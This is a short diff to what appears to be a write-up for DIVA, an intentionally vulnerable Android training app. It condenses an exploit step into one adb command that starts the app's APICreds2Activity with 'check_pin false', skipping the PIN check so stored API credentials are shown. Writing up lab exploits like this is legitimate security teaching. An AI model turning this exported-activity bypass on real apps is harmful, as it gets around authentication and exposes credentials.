@@ -47,6 +47,4 @@ else {
 
 Exploit:
 
-- `$ adb shell`
-
-- `# am start -n jakhar.aseem.diva/.APICreds2Activity -a jakhar.aseem.diva.action.VIEW_CREDS2 --ez check_pin false`
+- `$ adb shell am start -n jakhar.aseem.diva/.APICreds2Activity -a jakhar.aseem.diva.action.VIEW_CREDS2 --ez check_pin false`
